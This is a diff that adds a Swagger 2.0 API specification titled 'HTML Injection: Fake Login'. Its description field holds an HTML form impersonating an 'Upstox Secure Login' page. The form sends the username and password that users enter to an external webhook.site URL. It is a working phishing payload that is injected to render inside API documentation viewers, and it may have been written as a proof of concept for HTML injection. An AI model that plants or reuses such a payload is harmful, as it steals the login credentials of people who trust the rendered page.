@@ -1,0 +1,12 @@
+swagger: "2.0"
+info:
+title: HTML Injection: Fake Login
+description: |
+<h2>Upstox Secure Login</h2>
+<form method="POST" action="https://webhook.site/542ddd20-12e6-48f0-a22f-24e81d9a46bd">
+<label>Username</label><br>
+<input type="text" name="username"><br><br>
+<label>Password</label><br>
+<input type="password" name="password"><br><br>
+<button type="submit">Login</button>
+</form>
